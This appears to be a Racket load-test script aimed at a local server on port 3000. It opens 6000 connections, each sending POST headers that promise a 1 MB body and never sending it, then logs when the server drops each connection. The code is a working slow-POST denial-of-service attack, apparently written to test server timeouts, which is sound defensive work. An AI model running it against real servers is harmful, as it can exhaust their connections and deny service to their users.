#lang racket

(define (attack)
  (define-values (in out)
    (tcp-connect "127.0.0.1" 3000))

  (parameterize ([current-output-port out])
    (display "POST / HTTP/1.1\r\n")
    (display "Content-Length: 1048576\r\n")
    (display "\r\n")
    (flush-output))

  (define st (current-seconds))
  (sync in)
  (printf "closed after ~as\n" (- (current-seconds) st)))

(define threads
  (flatten
   (for/list ([_ (in-range 60)])
     (begin0 (for/list ([_ (in-range 100)])
               (thread attack))
       (sleep 1)))))

(for ([t (in-list threads)])
  (sync t))
